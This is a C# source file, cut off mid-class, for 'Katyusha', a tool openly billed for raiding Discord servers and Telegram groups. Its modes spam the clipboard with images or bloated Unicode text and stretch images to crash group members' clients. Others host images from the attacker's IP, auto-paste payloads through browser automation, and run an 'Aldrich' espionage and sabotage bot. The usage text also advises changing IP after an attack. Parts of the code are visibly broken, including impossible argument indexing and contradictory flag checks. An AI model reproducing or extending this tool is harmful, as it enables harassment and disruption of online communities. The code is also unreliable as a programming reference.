// 
//                                                .                                
//                                             .^~~~^:.                            
//                                         .^~~~!!!!!!~~^^.
//                                     .:^~~!!7!!!!!!!!!!!!~~^:..
//                                  .:~!~~!7!!77!!7!7!!!!!!!!77!~
//                              .:^~!!~~!!!77!!!~~!!!!?77!777!^:.                  
//                          .:^~~~!!?!!777!!~~!!~~777?77!!~^.
//                       .:^!!!!!!!7!77!~!~!7!~777??J777!~^:.                      
//                   .:^~~~~~~!!777!!!~!~!~7?7?777!7?77???JJJ?7~^.
//             :^:::^~!~~~~!!7!!!7!!777!!77??7!!~:.~7!!!!77????J?!^^^^^:..
//         .^7Y55YJ?!!~~!!!!!!~~~~!~7777???!7^.   .!7!!!!!!!?JJ????7JYYYYJ?!^.
//      :!J555Y5YYJJYJ??~~~!!!~!!!77?????7^.^     .!!!!!!!!!?Y?????J?JJJJJJ???^:
//  :!!?YP55YYJJYYYYYYJJJ7?7~777???77?!!~~~^:     .!!777?!!!?YJJYYYYJ?J?????7?7!^
//  .~777!J?JYYYYJJJJY5YYYY55J77!!7~:::..!?7::^^^^^~7JJ??!~!7YYPPPP5JJJJJJJJ?7?!^
//   .^^~!7777J?JYY5YYJY5PPY?7?7!!!~~^^:!77!77!~~!~~!7??J!^!7J5GP55YJ7??~^~7??!:^.
//     .:^^~~!!77?YJY5P5J?JY5Y?!77!!!!~~~~!~!~~~^^^^7JYYYJ!~?Y5YYYJJ?7?!.!Y5YYY7
//       ..:^~~~!7!?5JJJJYYJ?77??!!~!~~^^^^~^..!7^^?5Y?7!JY!JYJJJJJJJ?7^!55JYYY?
//          ...:^~~~!Y5J?~~~77?!~~^^^^~~^^~7777??!!JY7777Y!.:!?7!~^:..  ^Y5JJYJ:
//              .:^!77~:^~^~~~~^~!!77??JJJYYYYYYJ??JYJJJJ^               :!7!^
//                .~~~~^^:^~~~!??JJJJJJJ??7!?JJJYJ!!Y~:.                           
//                   .~!777!7???JJYYJJJ?^^^J5?J!!5J :.
//                     ::.:7???JYYJ??!?57^!5Y77?Y5^
//                         .^!?YJY777!JY: :!JYYJ7:                                 
//                            .^7YYYJY?:     ..
//                               :~~^.
// 
//                          \\ █▄▀ ▄▀█ ▀█▀ █▄█ █ █ █▀ █ █ ▄▀█ //
//                          // █ █ █▀█  █   █  █▄█ ▄█ █▀█ █▀█ \\
//                             GenesisFoundationCore / Katyusha
// 
//       ▄▀█ █▀▀ █▀▀ █▀▀ █▀ █▀ █ █▄░█ █▀▀   ▀█▀ █░█ █ █▀   █▀▀ █ █░░ █▀▀   █▄█ █▀█ █░█   ▄▀█ █▀█ █▀▀
//       █▀█ █▄▄ █▄▄ ██▄ ▄█ ▄█ █ █░▀█ █▄█   ░█░ █▀█ █ ▄█   █▀░ █ █▄▄ ██▄   ░█░ █▄█ █▄█   █▀█ █▀▄ ██▄
// 
//                             █▀ █░█ █▄▄ ░░█ █▀▀ █▀▀ ▀█▀   ▀█▀ █▀█
//                             ▄█ █▄█ █▄█ █▄█ ██▄ █▄▄ ░█░   ░█░ █▄█
// 
// ░█████╗░████████╗████████╗██████╗░██╗██████╗░██╗░░░██╗████████╗██╗░█████╗░███╗░░██╗░░░░░░
// ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██║██╔══██╗██║░░░██║╚══██╔══╝██║██╔══██╗████╗░██║░░░░░░
// ███████║░░░██║░░░░░░██║░░░██████╔╝██║██████╦╝██║░░░██║░░░██║░░░██║██║░░██║██╔██╗██║█████╗
// ██╔══██║░░░██║░░░░░░██║░░░██╔══██╗██║██╔══██╗██║░░░██║░░░██║░░░██║██║░░██║██║╚████║╚════╝
// ██║░░██║░░░██║░░░░░░██║░░░██║░░██║██║██████╦╝╚██████╔╝░░░██║░░░██║╚█████╔╝██║░╚███║░░░░░░
// ╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═════╝░░╚═════╝░░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝░░░░░░
// 
// ███╗░░██╗░█████╗░███╗░░██╗░█████╗░░█████╗░███╗░░░███╗███╗░░░███╗███████╗██████╗░░█████╗░██╗░█████╗░██╗░░░░░
// ████╗░██║██╔══██╗████╗░██║██╔══██╗██╔══██╗████╗░████║████╗░████║██╔════╝██╔══██╗██╔══██╗██║██╔══██╗██║░░░░░
// ██╔██╗██║██║░░██║██╔██╗██║██║░░╚═╝██║░░██║██╔████╔██║██╔████╔██║█████╗░░██████╔╝██║░░╚═╝██║███████║██║░░░░░
// ██║╚████║██║░░██║██║╚████║██║░░██╗██║░░██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝░░██╔══██╗██║░░██╗██║██╔══██║██║░░░░░
// ██║░╚███║╚█████╔╝██║░╚███║╚█████╔╝╚█████╔╝██║░╚═╝░██║██║░╚═╝░██║███████╗██║░░██║╚█████╔╝██║██║░░██║███████╗
// ╚═╝░░╚══╝░╚════╝░╚═╝░░╚══╝░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝╚═╝░░╚═╝╚══════╝
// 
// ░░██╗██╗░░░░█████╗░
// ░██╔╝██║░░░██╔══██╗
// ██╔╝░██║░░░██║░░██║
// ███████║░░░██║░░██║
// ╚════██║██╗╚█████╔╝
// ░░░░░╚═╝╚═╝░╚════╝░
// 
// ██╗███╗░░██╗████████╗███████╗██████╗░███╗░░██╗░█████╗░████████╗██╗░█████╗░███╗░░██╗░█████╗░██╗░░░░░
// ██║████╗░██║╚══██╔══╝██╔════╝██╔══██╗████╗░██║██╔══██╗╚══██╔══╝██║██╔══██╗████╗░██║██╔══██╗██║░░░░░
// ██║██╔██╗██║░░░██║░░░█████╗░░██████╔╝██╔██╗██║███████║░░░██║░░░██║██║░░██║██╔██╗██║███████║██║░░░░░
// ██║██║╚████║░░░██║░░░██╔══╝░░██╔══██╗██║╚████║██╔══██║░░░██║░░░██║██║░░██║██║╚████║██╔══██║██║░░░░░
// ██║██║░╚███║░░░██║░░░███████╗██║░░██║██║░╚███║██║░░██║░░░██║░░░██║╚█████╔╝██║░╚███║██║░░██║███████╗
// ╚═╝╚═╝░░╚══╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝╚═╝░░╚═╝╚══════╝
// 
// █─▄▄▄─█─▄▄▄─███▄─▄─▀█▄─█─▄█▀▀▀▀▀██▄─▀█▄─▄█─▄▄▄─███░█░██████─▄▄─█
// █─███▀█─███▀████─▄─▀██▄─▄██████████─█▄▀─██─███▀███▄▄░██░░██─██─█
// ▀▄▄▄▄▄▀▄▄▄▄▄▀▀▀▄▄▄▄▀▀▀▄▄▄▀▀▀▀▀▀▀▀▀▄▄▄▀▀▄▄▀▄▄▄▄▄▀▀▀▀▄▄▄▀▄▄▀▀▄▄▄▄▀
// 
// ▀█▀ █░█ █ █▀   █░░ █ █▀▀ █▀▀ █▄░█ █▀ █▀▀   █▀█ █▀▀ █▀█ █░█ █ █▀█ █▀▀ █▀   ▀█▀ █░█ ▄▀█ ▀█▀
// ░█░ █▀█ █ ▄█   █▄▄ █ █▄▄ ██▄ █░▀█ ▄█ ██▄   █▀▄ ██▄ ▀▀█ █▄█ █ █▀▄ ██▄ ▄█   ░█░ █▀█ █▀█ ░█░
// 
// █▀█ █▀▀ █░█ █▀ █▀▀ █▀█ █▀   █▀▀ █ █░█ █▀▀   █▀▀ █▀█ █▀▀ █▀▄ █ ▀█▀   ▀█▀ █▀█   ▀█▀ █░█ █▀▀
// █▀▄ ██▄ █▄█ ▄█ ██▄ █▀▄ ▄█   █▄█ █ ▀▄▀ ██▄   █▄▄ █▀▄ ██▄ █▄▀ █ ░█░   ░█░ █▄█   ░█░ █▀█ ██▄
// 
// █▀▀ █▀█ █▀▀ ▄▀█ ▀█▀ █▀█ █▀█ ░   █ ▀█▀   ▄▀█ █░░ █░░ █▀█ █░█░█ █▀   █▀█ █▀▀ █░█ █▀ █▀▀ █▀█ █▀   ▀█▀ █▀█
// █▄▄ █▀▄ ██▄ █▀█ ░█░ █▄█ █▀▄ ▄   █ ░█░   █▀█ █▄▄ █▄▄ █▄█ ▀▄▀▄▀ ▄█   █▀▄ ██▄ █▄█ ▄█ ██▄ █▀▄ ▄█   ░█░ █▄█
// 
// █▀▄ █ █▀ ▀█▀ █▀█ █ █▄▄ █░█ ▀█▀ █▀▀ ░   █▀█ █▀▀ █▀▄▀█ █ ▀▄▀ ░   ▄▀█ █▀▄ ▄▀█ █▀█ ▀█▀ ░   ▄▀█ █▄░█ █▀▄
// █▄▀ █ ▄█ ░█░ █▀▄ █ █▄█ █▄█ ░█░ ██▄ █   █▀▄ ██▄ █░▀░█ █ █░█ █   █▀█ █▄▀ █▀█ █▀▀ ░█░ █   █▀█ █░▀█ █▄▀
// 
// █▄▄ █░█ █ █░░ █▀▄   █░█ █▀█ █▀█ █▄░█   ▀█▀ █░█ █▀▀   █▀▄▀█ ▄▀█ ▀█▀ █▀▀ █▀█ █ ▄▀█ █░░   █ █▄░█   ▄▀█ █▄░█ █▄█
// █▄█ █▄█ █ █▄▄ █▄▀   █▄█ █▀▀ █▄█ █░▀█   ░█░ █▀█ ██▄   █░▀░█ █▀█ ░█░ ██▄ █▀▄ █ █▀█ █▄▄   █ █░▀█   █▀█ █░▀█ ░█░
// 
// █▀▄▀█ █▀▀ █▀▄ █ █░█ █▀▄▀█   █▀█ █▀█   █▀▀ █▀█ █▀█ █▀▄▀█ ▄▀█ ▀█▀ ░   █▀▀ █▀█ █▀█
// █░▀░█ ██▄ █▄▀ █ █▄█ █░▀░█   █▄█ █▀▄   █▀░ █▄█ █▀▄ █░▀░█ █▀█ ░█░ █   █▀░ █▄█ █▀▄
// 
// █▄░█ █▀█ █▄░█ █▀▀ █▀█ █▀▄▀█ █▀▄▀█ █▀▀ █▀█ █▀▀ █ ▄▀█ █░░   █▀█ █░█ █▀█ █▀█ █▀█ █▀ █▀▀ █▀   █▀█ █▄░█ █░░ █▄█ ░
// █░▀█ █▄█ █░▀█ █▄▄ █▄█ █░▀░█ █░▀░█ ██▄ █▀▄ █▄▄ █ █▀█ █▄▄   █▀▀ █▄█ █▀▄ █▀▀ █▄█ ▄█ ██▄ ▄█   █▄█ █░▀█ █▄▄ ░█░ ▄
// 


// System //
using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Text;
using System.Windows;
using System.Drawing;
using System.Diagnostics;
using System.Windows.Interop;
using System.Security.Principal;
using System.Windows.Media.Imaging;

// Selenium //

using OpenQA.Selenium;
using OpenQA.Selenium.IE;
using OpenQA.Selenium.Edge;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Safari;
using OpenQA.Selenium.Firefox;
using OpenQA.Selenium.Interactions;
using System.Threading.Tasks;

// Discord //

using Discord;
using Discord.WebSocket;

// Telegram //
using Telegram.Bot;
using Telegram.Bot.Types;


namespace Katyusha
{
    class Program
    {
        static string[] imageFiles;
        static string folderPath;
        static int isOnPause;
        static string clienttype;
        static string token;

        [STAThread]
        static void Main(string[] args)
        {
            if (args.Length != 2 || args[0].Equals("--help", StringComparison.OrdinalIgnoreCase))
            {
                ShowUsage();
                return;
            }
            folderPath = args[0];
            clienttype = args[2].ToLower();
            token = args[3].ToLower();

            if (!IsValidFolder(folderPath))
            {
                Console.WriteLine("Invalid folder path. Please provide a valid folder path. Or use --help");
                return;
            }
            else if (folderPath.Length > 0)
            {
                Console.WriteLine(@"
                                               .                                
                                            .^~~~^:.                            
                                        .^~~~!!!!!!~~^^.                        
                                    .:^~~!!7!!!!!!!!!!!!~~^:..                  
                                 .:~!~~!7!!77!!7!7!!!!!!!!77!~                  
                             .:^~!!~~!!!77!!!~~!!!!?77!777!^:.                  
                         .:^~~~!!?!!777!!~~!!~~777?77!!~^.                      
                      .:^!!!!!!!7!77!~!~!7!~777??J777!~^:.                      
                  .:^~~~~~~!!777!!!~!~!~7?7?777!7?77???JJJ?7~^.                 
            :^:::^~!~~~~!!7!!!7!!777!!77??7!!~:.~7!!!!77????J?!^^^^^:..         
        .^7Y55YJ?!!~~!!!!!!~~~~!~7777???!7^.   .!7!!!!!!!?JJ????7JYYYYJ?!^.     
     :!J555Y5YYJJYJ??~~~!!!~!!!77?????7^.^     .!!!!!!!!!?Y?????J?JJJJJJ???^:   
 :!!?YP55YYJJYYYYYYJJJ7?7~777???77?!!~~~^:     .!!777?!!!?YJJYYYYJ?J?????7?7!^  
 .~777!J?JYYYYJJJJY5YYYY55J77!!7~:::..!?7::^^^^^~7JJ??!~!7YYPPPP5JJJJJJJJ?7?!^  
  .^^~!7777J?JYY5YYJY5PPY?7?7!!!~~^^:!77!77!~~!~~!7??J!^!7J5GP55YJ7??~^~7??!:^. 
    .:^^~~!!77?YJY5P5J?JY5Y?!77!!!!~~~~!~!~~~^^^^7JYYYJ!~?Y5YYYJJ?7?!.!Y5YYY7   
      ..:^~~~!7!?5JJJJYYJ?77??!!~!~~^^^^~^..!7^^?5Y?7!JY!JYJJJJJJJ?7^!55JYYY?   
         ...:^~~~!Y5J?~~~77?!~~^^^^~~^^~7777??!!JY7777Y!.:!?7!~^:..  ^Y5JJYJ:   
             .:^!77~:^~^~~~~^~!!77??JJJYYYYYYJ??JYJJJJ^               :!7!^     
               .~~~~^^:^~~~!??JJJJJJJ??7!?JJJYJ!!Y~:.                           
                  .~!777!7???JJYYJJJ?^^^J5?J!!5J :.                             
                    ::.:7???JYYJ??!?57^!5Y77?Y5^                                
                        .^!?YJY777!JY: :!JYYJ7:                                 
                           .^7YYYJY?:     ..                                    
                              :~~^.                                             

                         \\ █▄▀ ▄▀█ ▀█▀ █▄█ █ █ █▀ █ █ ▄▀█ //
                         // █ █ █▀█  █   █  █▄█ ▄█ █▀█ █▀█ \\
                            GenesisFoundationCore/Katyusha
");
                switch (folderPath.ToLower())
                {
                    case "text":
                        TextMode();
                        break;
                    case "bm-8":
                        TextMode();
                        break;
                    case "fragment":
                        FragmentMode(Int32.Parse(args[1].ToLower()));
                        break;
                    case "bm-21":
                        FragmentMode(Int32.Parse(args[1].ToLower()));
                        break;
                }
            }

            try
            {
                imageFiles = GetImageFiles(folderPath);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }

            if (imageFiles.Length == 0)
            {
                Console.WriteLine("No image files found in the specified folder.");
                return;
            }

            MainLoop(args[1].ToLower(), imageFiles);
            Features(args);
        }

        static void MainLoop(string mode, string[] imageFiles)
        {
            while (true)
            {
                switch (mode.ToLower())
                {
                    // V1 Rockets

                    case "text":
                        TextMode();
                        break;
                    case "bm-8":
                        TextMode();
                        break;

                    case "normal":
                        NormalMode(imageFiles);
                        break;
                    case "bm-13":
                        NormalMode(imageFiles);
                        break;

                    case "random":
                        RandomMode(imageFiles);
                        break;
                    case "bm-18":
                        RandomMode(imageFiles);
                        break;

                    // V2 Rockets

                    case "grad":
                        FragmentMode(Int32.Parse(folderPath));
                        break;
                    case "bm-21":
                        FragmentMode(Int32.Parse(folderPath));
                        break;
                    case "uragan":
                        ConventMode(imageFiles);
                        break;
                    case "bm-27":
                        ConventMode(imageFiles);
                        break;

                    // V3 Rockets

                    case "smerch":
                        Hotlaunch(imageFiles);
                        break;
                    case "bm-30":
                        Hotlaunch(imageFiles);
                        break;

                    // V4 (Nuclear) Rockets

                    case "Aldrich":
                        new Program().Aldrich_KatyushaInternal(clienttype, folderPath, token).GetAwaiter();
                        break;

                    // Default

                    default:
                        Console.WriteLine($"Invalid mode for Payload: '{mode}'");
                        break;
                }
            }
        }

        static void Features(string[] features)
        {
            int e = 2;

            while (true)
            {
                if (features[e] == "--timer" && features[e] == "-t")
                {
                    Timer(Int32.Parse(features[e++]));
                    e++;
                }
                else if (features[e] == "--macro" && features[e] == "-m")
                {
                    Macro(features[e++]);
                    e++;
                }
                else
                {
                    Console.WriteLine("");
                }
            }
        }

        static void NormalMode(string[] imageFiles)
        {
            foreach (string imagePath in imageFiles)
            {
                if (Console.CapsLock && isOnPause > 0)
                {
                    // Don't Output
                }
                else if (!Console.CapsLock && isOnPause > 0)
                {
                    isOnPause--;
                }
                else if (Console.CapsLock)
                {
                    Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH: mm")}] (||) => CapsLock is enabled. Stopping the operation.");
                    isOnPause++;
                }
                else
                {
                    ProcessImage(imagePath);
                }
            }
        }

        static void RandomMode(string[] imageFiles)
        {
            Random random = new Random();
            foreach (string imagePath in imageFiles.OrderBy(x => random.Next()))
            {
                if (Console.CapsLock && isOnPause > 0)
                {
                    // Don't Output
                }
                else if (!Console.CapsLock && isOnPause > 0)
                {
                    isOnPause--;
                }
                else if (Console.CapsLock)
                {
                    Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH: mm")}] (||) => CapsLock is enabled. Stopping the operation.");
                    isOnPause++;
                }
                else
                {
                    ProcessImage(imagePath);
                }
            }
        }

        static void TextMode()
        {
            while (true)
            {
                if (Console.CapsLock && isOnPause > 0)
                {
                    // Don't Output
                }
                else if (!Console.CapsLock && isOnPause > 0)
                {
                    isOnPause--;
                }
                else if (Console.CapsLock)
                {
                    Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH: mm")}] (||) => CapsLock is enabled. Stopping the operation.");
                    isOnPause++;
                }
                else
                {
                    if (System.IO.File.Exists(folderPath + "*.txt*"))
                    {
                        string data = System.IO.File.ReadAllText(folderPath + "*.txt*");
                        Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH:mm")}] (+) => {data} ");
                        Clipboard.SetText(data);
                    }
                    else if (folderPath.Length > 0)
                    {
                        Clipboard.SetText(folderPath);
                        Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH:mm")}] (+) => {folderPath} ");
                    }
                    else
                    {
                        Clipboard.SetDataObject(Clipboard.GetDataObject());
                        Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH:mm")}] (+) => {Clipboard.GetDataObject()} ");
                    }
                }
            }
        }

        static void FragmentMode(int length)
        {
            while (true)
            {
                if (Console.CapsLock && isOnPause > 0)
                {
                    // Don't Output
                }
                else if (!Console.CapsLock && isOnPause > 0)
                {
                    isOnPause--;
                }
                else if (Console.CapsLock)
                {
                    Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH: mm")}] (||) => CapsLock is enabled. Stopping the operation.");
                    isOnPause++;
                }
                else
                {
                    string[] variableArray = Properties.Resource.Dumper.Split(',');
                    Random random = new Random();
                    StringBuilder generatedText = new StringBuilder();

                    for (int j = 0; j < length; j++)
                    {
                        int randomIndex = random.Next(variableArray.Length);
                        generatedText.Append(variableArray[randomIndex]);
                    }
                    Clipboard.SetText(generatedText.ToString());
                    Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH:mm")}] (+) => {generatedText} ");
                }
            }
        }

        static void ConventMode(string[] imageFiles)
        {
            if (Console.CapsLock && isOnPause > 0)
            {
                // Don't Output
            }
            else if (!Console.CapsLock && isOnPause > 0)
            {
                isOnPause--;
            }
            else if (Console.CapsLock)
            {
                Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH: mm")}] (||) => CapsLock is enabled. Stopping the operation.");
                isOnPause++;
            }
            else
            {
                foreach (string imagePath in imageFiles)
                {
                    Random random = new Random();

                    System.Drawing.Image img = System.Drawing.Image.FromFile(imagePath);
                    Bitmap resizedImage = new Bitmap(Int16.MaxValue, Int16.MinValue, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
                    Graphics graphics = Graphics.FromImage(resizedImage);
                    graphics.DrawImage(img, new Rectangle(0, 0, Int16.MaxValue, Int16.MinValue));
                    BitmapSource bitmapSource = ConvertDrawingImageToBitmapSource(img);
                    Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH:mm")}] (+) => {bitmapSource} ");
                    Clipboard.SetImage(bitmapSource);
                }
            }
        }

        static void ProcessImage(string imagePath)
        {
        retry:
            try
            {
                //// IGNORE ERROR
                /// Severity Code    Description Project File Line    Suppression State
                /// Error CS0012  The type 'Uri' is defined in an assembly that is not referenced.You must add a reference to assembly 'System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'.Katyusha    C: \Users\jpfaulve\source\repos\Katyusha\Katyusha\Program.cs 427 Active
                BitmapImage bitmapImage = new BitmapImage(new Uri(imagePath, UriKind.Absolute));
                //// IGNORE ERROR
                System.Drawing.Image drawingImage = ConvertBitmapImageToDrawingImage(bitmapImage);
                BitmapSource bitmapSource = ConvertDrawingImageToBitmapSource(drawingImage);
                Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH:mm")}] (+) => {imagePath} ");
                Clipboard.SetImage(bitmapSource);
            }
            catch (Exception ex)
            {
                if (ex.Message.Contains("Memory") || ex.Message.Contains("not"))
                {
                    goto retry;
                }
                Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH:mm")}] (-) => {imagePath} : {ex.Message} ");
            }
        }


        static string[] GetImageFiles(string folderPath)
        {
            return Directory.GetFiles(folderPath, "*.*", SearchOption.AllDirectories)
                .Where(file => file.ToLower().EndsWith(".jpg") ||
                               file.ToLower().EndsWith(".jpeg") ||
                               file.ToLower().EndsWith(".png") ||
                               file.ToLower().EndsWith(".gif") ||
                               file.ToLower().EndsWith(".apng"))
                .ToArray();
        }

        static bool IsValidFolder(string folderPath)
        {
            return Directory.Exists(folderPath);
        }

        static void ShowUsage()
        {
            Console.WriteLine(@"
 << Katyusha >> 
    Usage: Katyusha.exe [directory] [mode] [options]
                                  \ [mode] [options]

    Mode(s):

      v1 Rockets:

        text / BM-8                 : Uses Text Only. 

                                      Uses a text file from the directory
        [mode] [directory] [options]  if you dont have a directory it will
        text (c:\my\directory\)       use the second argument as a Text and
        bm-8 @everyone My Text!       if not it will default to your current
                                      clipboard.
        
        normal / BM-13              : Uses Images / Gif Files.

        [directory] [mode] [options]  Uses images / gif files in the specified
        (c:\my\directory) normal      directory, and will go through them top-bottom
        (c:\my\directory) bm-13                                     

        random / BM-18              : Uses Images / Gif files in random order.

        [directory] [mode] [options]  Randomizing the image will prevent any duplicates
        (c:\my\directory) random      from making an appearance will improve efficiency
        (c:\my\directory) bm-18

      v2 Rockets:
        
        grad / BM-21                : Uses Destructive Text.

        [mode] [int] [options]        Grad has improved destructiveness as the decendant
        grad 100                      of BM-8, Uses Bloated Unicode Text, It requires the
        bm-21 2100                    total number of text it will produce [int].

        uragan / BM-27              : Uses Destructive Images.
        [directory] [mode] [options]  Uragan a more destructive child of BM-13 and BM-18
        (c:\my\directory) uragan      Uses Images and tries to make it stretch to the
        (c:\my\directory) bm-18       Highest limits.

                                      Uragan Corrupts/Image Vortex/Image Crash the Image to
                                      the target in-order to crash the clients in the group.

      v3 Rockets:

        smerch / BM-30              : Uses sophisticated local image hosting to send to target
        [directory] [mode] [options]  Outputing Links to the image it will automatically load
        (c:\my\directory) smerch      as an embeded image, effective against discord servers,
        (c:\my\directory) bm-30       with embed/links enabked.
                                    [ Warning: Use VPN / Dynamic IP to change after an attack  ]
                                    [ This to prevent YOU from being DDoS'ed Because it uses   ]
                                    [ Your Local/Current IP, This needs to use your Public IP  ]
                                    [ to work.                                                 ] 
                               
      Sabotage:
        
        Aldrich                     : A Discord Bot that is a Espionage & Sabotage Spy that
        [directory] [mode] [options]  can be controlled locally without the use of commands
        (c:\dir..) aldrich -d         in the Discord Server.
        (c:\dir..) aldrich -t         
        
        -d / --discord / -dd        : Uses Discord Bot
        -t / --telegram / -tm       : Uses Telegram Bot

    Features:                       
                                    
        --timer / -t                : Time limit of the Operation if you don't wan't it to run
        ..[mode] --timer 15           For long periods. (In Seconds)
        ..[mode] -t 10

        --macro / -m                : Automates the process of Pasting and Sending the payload
        ..[mode] --macro              to the target server / group chat.
        ..[mode] -m

    Controls:

        CapsLock                    : Temporarily Pauses the current Operation(s) of Katyusha
                                      Including Mode(s) and Features that were used.
    

        
    Other:
        
                           For more details go to these following links:
        https://github.com/GenesisFoundationCore/Katyusha | https://github.com/GenesisFoundationCore
        
");
        }
        private static System.Drawing.Image ConvertBitmapImageToDrawingImage(BitmapImage bitmapImage)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                BitmapEncoder encoder = new PngBitmapEncoder();
                encoder.Frames.Add(BitmapFrame.Create(bitmapImage));
                encoder.Save(memoryStream);
                return System.Drawing.Image.FromStream(memoryStream);
            }
        }

        private static BitmapSource ConvertDrawingImageToBitmapSource(System.Drawing.Image drawingImage)
        {
            Bitmap bitmap = new Bitmap(drawingImage);
            IntPtr hBitmap = bitmap.GetHbitmap();
            BitmapSource bitmapSource = Imaging.CreateBitmapSourceFromHBitmap(
                hBitmap,
                IntPtr.Zero,
                Int32Rect.Empty,
                BitmapSizeOptions.FromEmptyOptions());
            return bitmapSource;
        }

        private static void Hotlaunch(string[] imageFiles)
        {
            string directoryPath = Environment.CurrentDirectory;
            HttpListener listener = new HttpListener();
            listener.Prefixes.Add("http://localhost:8080/");
            listener.Start();

            while (true)
            {
                if (Console.CapsLock && isOnPause > 0)
                {
                    // Don't Output
                }
                else if (!Console.CapsLock && isOnPause > 0)
                {
                    isOnPause--;
                }
                else if (Console.CapsLock)
                {
                    Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH: mm")}] (||) => CapsLock is enabled. Stopping the operation.");
                    isOnPause++;
                }
                else
                {
                    HttpListenerContext context = listener.GetContext();
                    HttpListenerResponse response = context.Response;

                    try
                    {
                        string ipAddress = GetLocalIPAddress();
                        string requestedFileName = context.Request.Url.Segments[1];
                        string fileExtension = Path.GetExtension(requestedFileName).ToLower();
                        if (fileExtension == ".png" || fileExtension == ".jpg" || fileExtension == ".jpeg" || fileExtension == ".apng" || fileExtension == ".gif")
                        {
                            string filePath = Path.Combine(directoryPath, requestedFileName);
                            if (System.IO.File.Exists(filePath))
                            {
                                byte[] fileBytes = System.IO.File.ReadAllBytes(filePath);
                                response.OutputStream.Write(fileBytes, 0, fileBytes.Length);
                                response.ContentType = GetContentType(fileExtension);
                                response.StatusCode = 200;
                                Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH:mm")}] (+) => {response}");
                                Clipboard.SetText($"http://{ipAddress}:8080/{requestedFileName}");

                            }
                            else
                            {
                                byte[] notFoundBytes = System.Text.Encoding.UTF8.GetBytes("404 Not Found");
                                response.OutputStream.Write(notFoundBytes, 0, notFoundBytes.Length);
                                response.StatusCode = 404;
                                Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH:mm")}] (-) => {response}");
                            }
                        }
                        else
                        {
                            byte[] badRequestBytes = System.Text.Encoding.UTF8.GetBytes("400 Bad Request");
                            response.OutputStream.Write(badRequestBytes, 0, badRequestBytes.Length);
                            response.StatusCode = 400;
                            Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH:mm")}] (-) => {response}");
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH: mm")}] (-) => Error: {ex.Message}");
                    }
                }
            }
        }

        private static string GetContentType(string fileExtension)
        {
            switch (fileExtension)
            {
                case ".png":
                    return "image/png";
                case ".jpg":
                    return "image/jpg";
                case ".jpeg":
                    return "image/jpeg";
                case ".apng":
                    return "image/apng";
                case ".gif":
                    return "image/gif";
                default:
                    return "application/octet-stream";
            }
        }

        private static string GetLocalIPAddress()
        {
            string ipAddress = "127.0.0.1";

            try
            {
                using (var socket = new System.Net.Sockets.TcpClient())
                {
                    socket.Connect("8.8.8.8", 53);
                    ipAddress = ((System.Net.IPEndPoint)socket.Client.LocalEndPoint).Address.ToString();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH: mm")}] (-) => Error: {ex.Message}");
            }

            return ipAddress;
        }

        // Features //

        private static void Timer(int timeduration)
        {
            int durationInSeconds = 5;
            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();

            Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH: mm")}] (Timer) => Timer has started waiting for ");

            while (stopwatch.Elapsed.TotalSeconds < durationInSeconds)
            {
                if (Console.CapsLock && isOnPause > 0)
                {
                    // Don't Output
                }
                else if (Console.CapsLock)
                {
                    Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH: mm")}] (||) => CapsLock is enabled. Stopping the operation.");
                    isOnPause++;
                    stopwatch.Stop();
                }
                else if (!Console.CapsLock && isOnPause > 0)
                {
                    stopwatch.Start();
                }
                else
                {
                    Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH: mm")}] (Timer) => {stopwatch.Elapsed.TotalSeconds}");
                }
            }

            if (stopwatch.Elapsed.TotalSeconds == durationInSeconds)
            {
                stopwatch.Stop();
                Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH: mm")}] (Timer) => Timer Has Stopped, Ending Operation . . .");
                Environment.Exit(0);
            }
        }

        private static void Macro(string browser)
        {
            if (!IsAdmin())
            {
                Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH: mm")}] (-) => Error: Insufficent Privillages, Run me again in Adminsitrator.");
                return;
            }
            else
            {
                IWebDriver driver = GetDriver(browser);

                try
                {
                    while (true)
                    {
                        Actions actions = new Actions(driver);
                        actions.KeyDown(Keys.Control).SendKeys("v").KeyUp(Keys.Control).Perform();
                        Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH: mm")}] (+) => {actions}");
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH: mm")}] (-) => {e}");
                }
            }
        }

